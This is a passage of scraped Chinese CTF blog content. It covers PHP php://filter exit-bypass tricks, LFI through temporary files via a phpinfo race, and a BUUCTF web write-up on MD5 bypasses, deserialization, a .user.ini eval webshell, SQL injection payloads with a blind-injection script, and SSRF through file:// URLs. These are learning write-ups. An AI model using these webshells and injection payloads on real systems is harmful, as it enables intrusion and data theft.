123456789101112// 这里要符合base64 解码按4 字节进行utf8 -&gt; utf-7&lt;?php exit();php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php变为：+ADw?php exit()+ADs-php://filter/write+AD0-aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+-+AHw-convert.iconv.utf-8.utf-7+AHw-convert.base64-decode/resource+AD0-shell.phpbase64恶意payload的之前正好36个字节，所以写入了shell 五、WMCTF Checkin12345678910111213141516&lt;?php//PHP 7.0.33 Apache/2.4.25error_reporting(0);$sandbox = &#x27;/var/www/html/&#x27; . md5($_SERVER[&#x27;HTTP_X_REAL_IP&#x27;]);@mkdir($sandbox);@chdir($sandbox);highlight_file(__FILE__);if(isset($_GET[&#x27;content&#x27;])) &#123; $content = $_GET[&#x27;content&#x27;]; if(preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;,$content)) die(&#x27;hacker&#x27;); if(file_exists($content)) require_once($content); echo $content; file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);&#125; 死亡exit的绕过 二次编码绕过查看伪协议处理的源码 12345678910111213141516171819202122232425static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) &#123; char *p, *token = NULL; php_stream_filter *temp_filter; p = php_strtok_r(filterlist, &quot;|&quot;, &amp;token); while (p) &#123; php_url_decode(p, strlen(p));#👈对过滤器进行了一次urldecode if (read_chain) &#123; if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123; php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter); &#125; else &#123; php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p); &#125; &#125; if (write_chain) &#123; if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123; php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter); &#125; else &#123; php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p); &#125; &#125; p = php_strtok_r(NULL, &quot;|&quot;, &amp;token); &#125;&#125; file_put_contents 中可以调用伪协议，而伪协议处理时会对过滤器 urldecode 一次，所以是可以利用二次编码绕过的，不过我们在服务端ban了%25（用%25太简单了）所以测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。知道可以用二次编码绕过了. 123456789101112&lt;?php$char = &#x27;r&#x27;; #构造r的二次编码for ($ascii1 = 0; $ascii1 &lt; 256; $ascii1++) &#123; for ($ascii2 = 0; $ascii2 &lt; 256; $ascii2++) &#123; $aaa = &#x27;%&#x27;.$ascii1.&#x27;%&#x27;.$ascii2; if(urldecode(urldecode($aaa)) == $char)&#123; echo $char.&#x27;: &#x27;.$aaa; echo &quot;\\n&quot;; &#125; &#125;&#125;?&gt; payload: php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=Cyc1e.php 注：payload放过滤器的位置或者放文件名位置都可（因为有些编码有时候会有空格什么的乱码，文件名不一定好用），php://filter面对不可用的规则是报个Warning，然后跳过继续执行的）。 过滤器构造绕过题目中过滤的过滤器有 /iconv|UCS|UTF|rot|quoted|base64/ php:filter支持使用多个过滤器,还留下了字符串过滤器中的部分和压缩过滤器以及加密过滤器. zlib 的 zlib.deflate 和 zlib.inflate ，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续 inflate 的内容，简单遍历一下可以发现中间插入 string.tolower 转后会把空格和 exit 处理了就可以绕过exit php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php 爆破临时文件先来看看 LFI 利用临时文件的 getshell 姿势。以下内容转载自： https://www.anquanke.com/post/id/201136 侵删 PHP LFIPHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。 假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件。 目前，常见的两种临时文件包含漏洞利用方法主要是： PHPINFO() and PHP7 Segment Fault ，利用这两种奇技淫巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。 临时文件在了解漏洞利用方式的时候，先来了解一下PHP临时文件的机制 全局变量 在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。 $_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。 123456$_FILES[&#x27;userfile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。$_FILES[&#x27;userfile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如&quot;image/gif&quot;。$_FILES[&#x27;userfile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。$_FILES[&#x27;userfile&#x27;][&#x27;error&#x27;] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端存储的临时文件名 在临时文件包含漏洞中 $_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;] 这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。 存储目录 文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由 php.ini 的 upload_tmp_dir 属性指定，假如 upload_tmp_dir 的路径不可写，PHP会上传到系统默认的临时目录中。 不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。 * Linxu系统服务的临时文件主要存储在根目录的tmp文件夹下，具有一定的开放权限。 * Windows系统服务的临时文件主要存储在系统盘Windows文件夹下，具有一定的开放权限。 C:/Windows/Temp/ 命名规则 存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。 可以通过phpinfo来查看临时文件的信息。 Linux Temporary File Linux临时文件主要存储在/tmp/目录下，格式通常是（/tmp/php[6个随机字符]） Windows Temporary File Windows临时文件主要存储在C:/Windows/目录下，格式通常是（C:/Windows/php[4个随机字符].tmp） PHPINFO特性通过上面的介绍，服务器上存储的临时文件名是随机的，这就很难获取其真实的文件名。不过，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。 虽说这个漏洞出现的很早(2011年，国外的安全研究人员将这种攻击手法进行了公布)，不过这个技巧确实是个很经典的列子，不会被遗忘的。 测试测试代码： index.php 123456&lt;?php $file = $_GET[&#x27;file&#x27;]; include($file);?&gt; phpinfo.php: &lt;?php phpinfo();?&gt; 漏洞分析当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。 利用phpinfo的特性可以很好的帮助我们，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，拿到临时文件变量名之后，就可以进行包含执行我们传入的恶意代码。 漏洞利用 利用条件 无 PHPINFO的这种特性源于php自身，与php的版本无关 测试脚本 编写脚本，上传文件探测是否存在phpinfo包含临时文件的信息。 12345678import requestsfiles = &#123; &#x27;file&#x27;: (&quot;aa.txt&quot;,&quot;ssss&quot;)&#125;url = &quot;http://x.x.x.x/phpinfo.php&quot;r = requests.post(url=url, files=files, allow_redirects=False)print(r.text) 运行脚本向服务器发出请求可以看到回显中有如下内容 linux: windows： 利用原理 验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。 但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。 利用过程 这个时候就需要用到条件竞争，具体原理和过程如下： （1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据 （2）因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大 （3）php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接 （4）所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包 （5）此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除 （6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell （参考ph牛：https://github.com/vulhub/vulhub/tree/master/php/inclusion ） getshell利用ph牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如上传的恶意文件内容、phpinfo.php和index.php相应文件的文件名和位置、系统临时文件写入目录等","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xizhi-future.github.io/categories/PHP/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://xizhi-future.github.io/tags/PHP/"}],"author":"xizhi-future"},{"title":"BUUCTF-WEB(三)","slug":"BUUCTF-WEB（三）","date":"2021-06-04T10:25:29.000Z","updated":"2021-07-09T07:27:06.204Z","comments":true,"path":"2021/06/04/BUUCTF-WEB（三）/","link":"","permalink":"https://xizhi-future.github.io/2021/06/04/BUUCTF-WEB%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"概述：本篇是 BUUCTF-WEB方向的第三篇，其中涵盖的范围较广，包括 SQL注入、序列化与反序列化、文件上传、数据库的特性、PHP弱类型、MD5碰撞以及相关漏洞、文件包含、PHP伪协议、SSRF。","text":"概述：本篇是 BUUCTF-WEB方向的第三篇，其中涵盖的范围较广，包括 SQL注入、序列化与反序列化、文件上传、数据库的特性、PHP弱类型、MD5碰撞以及相关漏洞、文件包含、PHP伪协议、SSRF。 一、[极客大挑战 2019]BuyFlag1考点：PHP 弱类型、strcmp() 函数漏洞 查看源码发现 1234567891011&lt;!-- ~~~post money and password~~~if (isset($_POST[&#x27;password&#x27;])) &#123; $password = $_POST[&#x27;password&#x27;]; if (is_numeric($password)) &#123; echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;; &#125;elseif ($password == 404) &#123; echo &quot;Password Right!&lt;/br&gt;&quot;; &#125;&#125;--&gt; 根据PHP的弱类型，直接构造 money=100000000&amp;password=404a 显而易见，要我们是cuit的身份才可以 抓包查看，存在 user=0，当然，直接进行修改 user=1，发现 身份已经改变，然后我们post传入参数 password 和 money 提示我们 数字过长，我们可以使用科学计数法 1e9 或者是 money[]=100000000 二、[BJDCTF2020]Easy MD51考点：md5($a,true) sql绕过、md5碰撞绕过、md5数组绕过 输入什么都没有什么显示，抓包看看 发现提示 select * from &#39;admin&#39; where password=md5($pass,true 网上查：造成md5()漏洞的值：ffifdyop 紧接着抓包，查看 发现源码 1234567&lt;!--$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend.--&gt; 则构造 1?a=240610708&amp;b=QNKCDZO 源码 123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; 构造以下内容，得到 flag 1?param1[]=0&amp;param2[]=1 md5 碰撞 2.1 总结：MD5 绕过 sql md5 绕过 sql ：md5 和 sha1 支持第二个参数，如果为 true，则会将 hash 后的 16 进制字符串以 16 进制转成字符串的形式返回，如果在 SQL 语句中这样写，会存在注入的问题。 1234567提供一个字符串：ffifdyop，md5后，276f722736c95d99e921722cf9ed621c再转成字符串：&#x27;or&#x27;6É]™é!r,ùíb，即md5(&#x27;ffifdyop&#x27;,true) =&#x27;or&#x27;6É]™é!r,ùíb // 可以实现绕过 $password = &quot;ffifdyop&quot;; $sql = &quot;SELECT * FROM admin WHERE pass = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;; var_dump($sql); 三、[ZJCTF 2019]NiZhuanSiWei1考点：文件包含、php伪协议、序列化与反序列化 12345678910111213141516171819 &lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 123?text=data://test/plain,welcome to the zjctf或者是?text=data://test/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= file 参数不能含有 flag 构造 1?text=data://test/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php 得到 useless.php的内容如下： 123456789101112&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; __tostring() 是在直接输出对象引用时自动调用的方法，可以看到在源码最后对password这个变量进行了反序列化，然后进行输出，那么如果我们传入一个对象的话，在对象进行 echo 时就会调用 __tostring() 魔术方法，获取到 $file 中的内容。 123$a = new Flag();$a-&gt;file = &quot;flag.php&quot;;echo serialize($a); 得到 1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 最终的 payload 1?text=data://test/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 查看源码得到 flag 四、[SUCTF 2019]CheckIn1考点：文件上传、图片木马 过 &lt;?、.user.ini配置文件的使用 上传 .php .php2 .php3 .php5 .phtml，发现不被允许 修改 Content-Type , 发现不能包含 &lt;? 修改文件内容 &lt;script language=&quot;php&quot;&gt;@eval($_POST[111])&lt;/script&gt; ，返回 exif_imagetype:not image! 在文件内容开头加上 GIF89a，得到上传路径，发现 非图片类型 访问不能用蚁剑连上 想到的解决办法：.htaccess .user.ini 区分： .htaccess 是 Apache服务器的分布式配置文件，该配置文件会覆盖 Apache服务器的全局配置 httpd-conf ，只对该文件所在目录下的文件起作用 .user.ini 是 PHP的目录配置文件（局部的），相当于用户自己定义的一个 php.ini 文件。不仅仅限于 Apache 服务器，还可以用于 Nginx , IIS 等服务器。 查看该题目的服务器：openresty OpenResty® 是一个成熟的网络平台，它集成了我们的 Nginx 核心增强版、LuaJIT 增强版、许多精心编写的 Lua 库、大量高质量的 3rd-party Nginx 模块以及它们的大部分外部依赖项。 只能使用 .user.ini ，并且结合该方法的使用条件，该目录下必须含有 .php 文件，下面的图片中可以看到该题目中含有 index.php 文件 编写 .user.ini 文件并上传 12GIF89a auto_prepend_file=.hack_GIF_ma.gif 编写 hack_GIF_ma.gif 文件并上传 123Content-Type:image/gif文件名：hack_GIF_ma.gif文件内容：GIF89a&lt;script language=&quot;php&quot;&gt;@eval($_GET[&quot;cmd&quot;])&lt;/script&gt; 可以看到给我们回显的内容是我们成功上传的文件路径，以及当前目录下的文件，发现 index.php 访问 index.php 123/uploads/79d126728819a4f553622db4444bccf9/index.php?cmd=var_dump(scandir(&#x27;/&#x27;));/uploads/79d126728819a4f553622db4444bccf9/index.php?cmd=system(&#x27;cat /flag&#x27;); 4.1 总结：检查是否是图片 函数123456789exif_imagetype ( string $filename ) : int 1. 判断一个图像的类型 2. 读取一个图像的第一个字节并检查其签名。 3. 如果发现了恰当的签名则返回一个对应的预定义常量，否则返回 false。 getimagesize ( string $filename , array &amp;$imageinfo = ? ) : array — 取得图像大小 1. 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串 2. 如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 false 并产生一条 E_WARNING 级的错误。 五、[极客大挑战 2019]HardSQL1考点：SQL 注入 之 绕 = ，回显不完全 暴库： 空格、and、#、--+、&amp;&amp;、select、union、order、by、| 等 都被过滤掉了，但是没有过滤掉 or，并且有报错，字符型注入，单引号闭合 123a&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))or&#x27;a&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) or&#x27;# 数据库 geek 暴表：过滤 空格、= 12a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;# 表 H4rDsq1 查列： 12a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;# 列 id,username,password 查数据： 123456789a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(concat_ws(&#x27;~&#x27;,username,password)))from(geek.H4rDsq1)),0x7e),1))or&#x27;# flag 查不完全，使用 substr()函数，被过滤，使用 mid()，被过滤，使用# left() 和 right() a&#x27;or(updatexml(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1)),0x7e),1))or&#x27; a&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e),1))or&#x27; #得到 flag 5.1 总结查不完全时可使用的函数： substr() left() right() substring() mid() 当 条件 当中的 = 被过滤时，使用 like 六、[CISCN2019 华北赛区 Day2 Web1]Hack World1考点：SQL注入 之 盲注 过滤了空格、/**/、and、#、or、没有过滤 |、&amp; 1在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交&#x27;id=2/2&#x27;，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。 数字型注入 1利用/*!union*/可以绕过对union的过滤 新的盲注手法： 12#例如：select * from users where id=(length(database())&gt;3); 盲注脚本 123456789101112131415161718192021import requestsimport timeimport reurl=&#x27;http://d0e648d5-1dd9-4eac-86c5-4dd5c8516203.node3.buuoj.cn/index.php&#x27;flag = &#x27;&#x27;for i in range(1,43): max = 127 min = 0 for c in range(0,127): s = (int)((max+min)/2) payload = &#x27;1^(ascii(substr((select(flag)from(flag)),&#x27;+str(i)+&#x27;,1))&gt;&#x27;+str(s)+&#x27;)&#x27; r = requests.post(url,data = &#123;&#x27;id&#x27;:payload&#125;) time.sleep(0.005) if &#x27;Hello, glzjin wants a girlfriend.&#x27; in str(r.content): max=s else: min=s if((max-min)&lt;=1): flag+=chr(max) breakprint(flag) 七、[网鼎杯 2018]Fakebook1考点：SQL 注入 + SSRF + 序列化与反序列化 Join 一下，Blog 必须是 链接类型的，参与成功之后去 Login 一下，进入到个人的博客界面，发现URL发生变化，存在注入点 数字型注入，过滤了 union select，/**/ 绕过 12345678910111213141516171819201#1 order by 4#1 union/**/select 1,2,3,4#-1 union/**/select 1,database(),3,4## 数据库 fakebook -1 union/**/select 1,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;fakebook&#x27;),3,4## 表 users -1 union/**/select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;fakebook&#x27;),3,4## 列 no,username,passwd,data -1 union/**/select 1,(select group_concat(concat_ws(&#x27;~&#x27;,username,passwd)) from fakebook.users),3,4## 查到的是刚刚用户添加的账号以及密码，没有管理员的-1 union/**/select 1,(select group_concat(no) from fakebook.users),3,4## 1,2-1 union/**/select 1,(select group_concat(data) from fakebook.users),3,4##内容如下 查到的 data 内容如下，是刚刚我注册的账号进行序列化之后的内容 1O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;xi&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:6:&quot;xi.com&quot;;&#125;,O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;qq&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:6:&quot;xi.com&quot;;&#125; 存在 robots.txt 下载备份文件，源码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php class UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; //初始化一个新的cURL会话并获取一个网页 function get($url) &#123; //初始化一个 curl会话，即创建一个新的 curl 资源 $ch = curl_init(); //设置 URL和相应的选项 curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //执行 curl会话，即抓取URL并将它传递给浏览器 $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; //关闭Curl资源，并且释放系统资源 curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 流程：当用户创建一个新的账号时，就输入了一些信息，其中包括Blog，它被要求是一个链接，并且从上面的源码当中可以看到它的值是做了一些过滤的，当用户成功登陆近期之后，点击自己的博客链接会看到用户最开始所输入的信息内容，以下图的方式显示。 然后 get($url) 函数将我们的页面传给浏览器，即存在 SSRF； 而我们进行SQL注入之后发现的 data 数据很显然是将用户输入的信息内容进行序列化之后保存的，可以理解为：它将用户输入的信息进行序列化存储到数据库的data字段中，而后又进行反序列化才将内容显示到浏览器的页面当中。也就是说，它会对用户输入的内容进行解析 对该页面源码查看，可以看到，它将我们的Blog内容传到了 &lt;iframe&gt; 中， 构造 1-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;xi&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;# 查看源码之后，点击链接获得 flag **另一种解法：没有过滤 load_file() ** 1-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4# 7.1 总结：Mysql 对文件的操作 load_file() load data infile() system cat 使用条件：1. 有File权限（File_priv的值）；2. secure_file_priv 的值不为 NULL 注：&gt;=5.7.16默认值为NULL，&lt;5.7.16则为空 12#查看 File_privselect File_priv from mysql.user where user=&#x27;root&#x27; and host =&#x27;localhost&#x27;; 12345678910#查看 secure_file_privshow global variables like &quot;secure_file_priv&quot;;值是 NULL --- 不允许文件导入导出操作值是 空 --- 不对mysql的导入导出操作做出限制值是 具体路径 限制mysql的导入与导出操作限制在指定路径下#修改# Windows 下修改 mysql.ini 文件 （secure_file_priv =）# Linux 下在/etc/my.cnf的[mysqld]下面添加local-infile=0选项 读取文件 12345678# load_file()select load_file(&#x27;D:/test.txt&#x27;);# load data infile()# 利用该函数读文件时需要将文件内容保存至一个表中create table test(content text);load data infile &#x27;D:\\\\test.txt&#x27; into table test;select * from test; 写入文件 1select * into outfile &#x27;D:\\\\users.txt&#x27; from users; 八、[网鼎杯 2020 青龙组]AreUSerialz1考点：序列化与反序列化，private、public、protected 序列化区别 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980 &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 分析： 12345671.?str传参，如果参数满足is_valid($s)条件，将会使用 unserialize($str)，紧接着将触发 __destruct()魔术方法2.判断 op值，如果是2的话，将强制转换为13.调用 process()函数4.op值为1将写文件；值为2将读取文件内容5.另外，如果我们创建了一个对象也将会从第三步开始6.我们需要读取到 flag.php 文件中的内容，当传入参数str时就需要绕过对op===2的检测（方法是：op=空格2 或者是 op=数字2），这样即满足了op!===&quot;2&quot; 但 op==&quot;2&quot;7.这样就成功进入到了 read()函数：将会使用 file_get_contents($this-&gt;filename)进行文件的读取 构造： 123456789101112131415161718192021222324&lt;?php class FileHandler &#123; protected $op = 2; protected $filename = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;; protected $content; &#125;$a = new FileHandler();echo serialize($a);?&gt;# protected 得到：O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;*content&quot;;N;&#125;#不可直接使用#php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public便可绕过# public (使用php://filter) 得到：O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;# public 不使用 (php://filter) 查看源码可获得 flag ：# O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; # urlencode() (不使用 php://filter) 得到：O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D#将其中的 %00 换成 \\00，s 换成 S 8.1 总结：Ascii 码的可打印字符与不可打印字符ASCII（American Standard Code for Information Interchange，美国信息互换标准代码，ASCⅡ）是基于拉丁字母的一套电脑编码系统。它主要用于显示现代英语和其他西欧语言。它是现今最通用的 单字节编码系统，并等同于国际标准ISO/IEC 646。 ASCII字符集由95个可打印字符（0x20-0x7E）和33个控制字符（0x00-0x1F，0x7F）组成。可打印字符用于显示在输出设备上，例如荧屏或者打印纸上，控制字符用于向计算机发出一些特殊指令，例如0x07会让计算机发出哔的一声，0x00通常用于指示字符串的结束，0x0D和0x0A用于指示打印机的打印针头退到行首（回车）并移到下一行（换行）。 不可打印字符（控制字符） 转载于：https://blog.csdn.net/qq_38769551/article/details/101459811 九、[GXYCTF2019]BabySQli1考点：SQL 注入 之 联合查询 特性：临时添加虚拟用户： 过滤了 &#39;) &#39;)) &quot;) order floor order by &#39;1&#39;=&#39;1 页面源码中可以获得 无 =，猜测是 base32 编码，之后 base64 解码，得到 1select * from user where username = &#x27;$name&#x27; 过滤了 order by ，但居然可以 Order by 1admin&#x27; Order by 3# 联合查询并不存在的数据时，联合查询会构造一个虚拟的数据，例如： 则我们构造，判断出 三列分别为 id,username,password 11&#x27; union select 1,&#x27;admin&#x27;,&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;# 然后在同时输入 password 为 123456 即可 十、[MRCTF2020]你传你🐎呢1考点：文件上传 之 .htaccess 